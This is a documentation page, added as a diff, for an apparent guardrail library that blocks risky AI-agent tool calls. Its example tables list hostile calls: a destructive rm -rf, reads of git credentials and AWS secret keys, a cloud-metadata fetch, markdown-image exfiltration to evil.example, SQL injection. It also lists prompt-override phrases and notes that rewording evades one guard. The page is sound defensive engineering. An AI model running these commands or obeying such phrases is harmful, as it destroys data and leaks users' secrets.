@@ -1,0 +1,256 @@
+# Using detectors
+
+Detectors are ready-made rules, one per kind of attack. interlock ships 105 of
+them: prompt-injection signatures, SQL injection, secret and PII redaction,
+egress allowlists, SSRF checks, loop and budget limits, MCP trust checks, and
+more. This guide shows how to pick them, how to avoid the one mistake that makes
+a detector silently useless, and three starter sets you can copy.
+
+The full list, with what each one catches and which calls it looks at, is the
+[detector catalog](../reference/detectors.md).
+
+## Install the ones you want
+
+Nothing is on by default. Import a detector's factory, call it to build the rule,
+and install it like any other rule:
+
+```python
+import interlock
+from interlock.detectors import network_egress_guard, pii_redaction_guard
+from interlock.detectors.sql_injection_guard import sql_injection_guard
+
+interlock.install(rules=[
+    sql_injection_guard(),
+    network_egress_guard(allowed_hosts=["api.acme.com"]),
+    pii_redaction_guard(),          # rewrites go last
+])
+```
+
+Eight general-purpose detectors import straight from `interlock.detectors`:
+`prompt_injection_detector`, `jailbreak_detector`, `execution_guard`,
+`tool_allowlist`, `tool_denylist`, `network_egress_guard`, `sensitive_path_guard`,
+and `pii_redaction_guard`. Every other one imports from its own module,
+`interlock.detectors.<name>`.
+
+Detectors are rules, so the [ordering advice](writing-rules.md#put-rules-in-the-right-order)
+applies: detectors that block go before detectors that rewrite.
+
+## Check which calls a detector looks at
+
+This is the mistake to avoid. Detectors fall into three groups:
+
+- **Named actions.** About a third of the detectors only look at tools with
+  particular names. The redactors, for example, check tools called things like
+  `http_post`, `send`, or `upload`. A tool named `post_to_crm` is skipped
+  entirely, with no warning.
+- **Any call.** Many detectors scan every string argument of every tool. These
+  never miss a tool, but they can fire where you didn't expect.
+- **Special events.** The MCP trust detectors look at connect and listing
+  events, or at labels your app adds. See the [MCP guide](mcp.md).
+
+The **Scoped to** column of the [catalog](../reference/detectors.md) tells you
+which group each detector is in. Check it before you rely on one.
+
+### When your tool names don't match
+
+Some detectors let you pass your own names. `network_egress_guard` takes
+`egress_actions=`, `pii_redaction_guard` takes `actions=`, and `execution_guard`
+takes `execution_actions=`. The catalog marks these "Configurable".
+
+```python
+network_egress_guard(allowed_hosts=["api.acme.com"], egress_actions=["fetch_url", "post_to_crm"])
+```
+
+For a detector with a fixed list, present your tool under a name it knows. These
+two small helpers, `only_for` and `as_action`, are worth copying into your
+project:
+
+```python
+from dataclasses import replace
+
+
+def only_for(actions, rule):
+    """Run `rule` only for the named tools."""
+    names = frozenset(actions)
+
+    def scoped(event):
+        return rule(event) if event.action in names else None
+
+    scoped.phase = getattr(rule, "phase", "call")
+    return scoped
+
+
+def as_action(name, rule):
+    """Show `rule` every event as if the tool were called `name`."""
+    def renamed(event):
+        return rule(replace(event, action=name))
+
+    renamed.phase = getattr(rule, "phase", "call")
+    return renamed
+```
+
+```python
+from interlock.detectors.email_pii_redactor import email_pii_redactor
+
+email_pii_redactor()                    # post_to_crm isn't on its list...
+# post_to_crm {'text': 'contact jane@example.com'} -> {'text': 'contact jane@example.com'}
+
+only_for({"post_to_crm"}, as_action("http_post", email_pii_redactor()))
+# post_to_crm {'text': 'contact jane@example.com'} -> {'text': 'contact [REDACTED EMAIL]'}
+```
+
+### When an "any call" detector fires too often
+
+`path_traversal_guard` scans every string argument for `../`. That's right for a
+file tool and wrong for a chat message:
+
+```python
+from interlock.detectors.path_traversal_guard import path_traversal_guard
+
+path_traversal_guard()
+# send_message {'text': 'see ../docs for details'} -> Blocked: path_traversal: text
+```
+
+Narrow it to the tools it's meant for:
+
+```python
+FILE_TOOLS = {"read_file", "write_file", "list_dir"}
+only_for(FILE_TOOLS, path_traversal_guard())
+# read_file {'path': '../../app/config.yaml'} -> Blocked: path_traversal: path
+# send_message {'text': 'see ../docs for details'} -> allowed
+```
+
+## Starter sets
+
+Three combinations to start from. Each was run against the calls shown, and
+every one of those calls behaved as listed. Run them in
+[monitor mode](../getting-started.md#7-try-a-rule-without-enforcing-it) on real
+traffic first and adjust.
+
+### A coding agent (shell and files)
+
+```python
+from interlock.detectors.destructive_command_guard import destructive_command_guard
+from interlock.detectors.sensitive_file_write_guard import sensitive_file_write_guard
+from interlock.detectors.env_secret_read_guard import env_secret_read_guard
+from interlock.detectors.git_credential_guard import git_credential_guard
+from interlock.detectors.path_traversal_guard import path_traversal_guard
+from interlock.detectors.duplicate_call_loop_guard import duplicate_call_loop_guard
+
+CODING_RULES = [
+    destructive_command_guard(),
+    sensitive_file_write_guard(),
+    env_secret_read_guard(),
+    git_credential_guard(),
+    only_for({"read_file", "write_file", "list_dir"}, path_traversal_guard()),
+    duplicate_call_loop_guard(limit=3),
+]
+```
+
+| Call | Result |
+|---|---|
+| `run_shell(cmd="pytest -q")` | allowed |
+| `run_shell(cmd="rm -rf / --no-preserve-root")` | blocked: `destructive_command` |
+| `write_file(path="/home/me/.ssh/authorized_keys", ...)` | blocked: `sensitive_write` |
+| `run_shell(cmd="cat ~/.git-credentials")` | blocked: `git_credential_read` |
+| `run_shell(cmd="echo $AWS_SECRET_ACCESS_KEY")` | blocked: `env_secret_read` |
+| `read_file(path="../../app/config.yaml")` | blocked: `path_traversal` |
+| the same `run_shell(cmd="npm test")` four times in a row | fourth blocked: `repeated call` |
+
+A coding agent runs code it wrote, which no argument check can fully vet. Pair
+these rules with the [sandbox](sandbox.md) for anything it executes.
+
+### A browsing or research agent
+
+```python
+from interlock.detectors.private_ip_egress_guard import private_ip_egress_guard
+from interlock.detectors.raw_ip_egress_guard import raw_ip_egress_guard
+from interlock.detectors.markdown_image_exfil_guard import markdown_image_exfil_guard
+from interlock.detectors.data_volume_egress_guard import data_volume_egress_guard
+from interlock.detectors.tool_result_injection_guard import tool_result_injection_guard
+
+BROWSING_RULES = [
+    private_ip_egress_guard(),          # no internal hosts or cloud metadata (SSRF)
+    raw_ip_egress_guard(),              # no bare-IP destinations
+    markdown_image_exfil_guard(),       # no data smuggled out in image URLs
+    data_volume_egress_guard(max_bytes=100_000),
+    tool_result_injection_guard(),      # checks what pages say back
+]
+```
+
+| Call | Result |
+|---|---|
+| `fetch(url="https://en.wikipedia.org/wiki/Agent")` | allowed |
+| `fetch(url="http://169.254.169.254/latest/meta-data/")` | blocked: private, link-local |
+| `fetch(url="http://10.0.0.5/admin")` | blocked: private |
+| `respond(text="![x](https://evil.example/p.png?data=SECRET)")` | blocked: `markdown_image_exfil` |
+| a `fetch` result saying "Ignore previous instructions..." | blocked: `tool_result_injection` |
+
+If the agent should only reach known sites, add
+`network_egress_guard(allowed_hosts=[...])` first. An allowlist doesn't depend on
+spotting an attack, so it's the strongest rule here.
+
+### An agent that works with business data
+
+```python
+from interlock.detectors import pii_redaction_guard, tool_allowlist
+from interlock.detectors.sql_injection_guard import sql_injection_guard
+from interlock.detectors.mass_assignment_guard import mass_assignment_guard
+from interlock.detectors.write_action_limiter import write_action_limiter
+
+BUSINESS_RULES = [
+    tool_allowlist(["lookup_customer", "update_ticket", "send_email", "run_report"]),
+    sql_injection_guard(),
+    mass_assignment_guard(),
+    write_action_limiter(limit=30),
+    pii_redaction_guard(),
+]
+```
+
+| Call | Result |
+|---|---|
+| `lookup_customer(customer_id="42")` | allowed |
+| `delete_customer(customer_id="42")` | blocked: not on allowlist |
+| `run_report(sql="... WHERE name = '' OR '1'='1'")` | blocked: `sql_injection` |
+| `update_ticket(id=7, is_admin=True)` | blocked: `mass_assignment` |
+| `send_email(to=..., body="Your SSN 123-45-6789 is on file")` | rewritten: `Your SSN [REDACTED SSN] is on file` |
+
+## Extend a detector's patterns
+
+Many signature detectors accept `extra_patterns=` to add your own phrases, matched
+case-insensitively. `prompt_injection_detector` also takes `content_keys=` to scan
+only the arguments that carry untrusted text:
+
+```python
+from interlock.detectors import prompt_injection_detector
+
+prompt_injection_detector(
+    content_keys=["document", "page_text"],
+    extra_patterns=["ignore all previous instructions", "you are now in developer mode"],
+)
+```
+
+The catalog's **Factory** column shows each detector's parameters.
+
+## What detectors can't do
+
+- **They match patterns, not meaning.** Each detector looks for shapes an
+  ordinary value won't contain. That keeps false alarms low and means rewording
+  can get past them: `markdown_image_exfil_guard` catches `?data=` and `?token=`
+  but not `?d=`. Allowlists (`network_egress_guard`, `tool_allowlist`,
+  `rag_source_allowlist`) don't have this weakness, so lean on them where you
+  can.
+- **Most check calls, not results.** Only `tool_result_injection_guard` reads
+  tool output. To scan output for secrets or PII, write a
+  [result rule](writing-rules.md#check-results).
+- **Stateful detectors count per process.** Rate limiters, budgets, and loop
+  guards keep their counts in memory. Each new process (or each new factory call)
+  starts from zero.
+
+## Next
+
+- [Detector catalog](../reference/detectors.md): all 105, grouped, with scope
+  and parameters.
+- [Writing rules](writing-rules.md): for anything a detector doesn't cover.
+- [Adding a detector](../../CONTRIBUTING.md#adding-a-detector): contributing a
+  new one.
